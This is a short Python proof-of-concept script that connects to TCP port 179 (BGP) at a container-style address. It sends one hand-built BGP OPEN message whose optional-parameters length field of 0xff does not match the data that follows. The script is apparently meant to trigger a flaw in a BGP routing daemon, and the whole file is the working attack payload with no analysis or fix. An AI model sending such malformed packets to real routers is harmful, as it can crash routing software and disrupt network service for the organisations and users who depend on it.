import socket

payload = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00"\x01\x04\x00\x02\x00\x05\xac\x11\x00\x01\xff\xff\x00\x02\x00\x00'
print("[+] Creating socket...")
s = socket.socket(type=socket.SOCK_STREAM)

print("[+] Connecting to server...")
s.connect(('172.17.0.4', 179))
s.send(payload)
s.close()

print("[+] Poc sent")
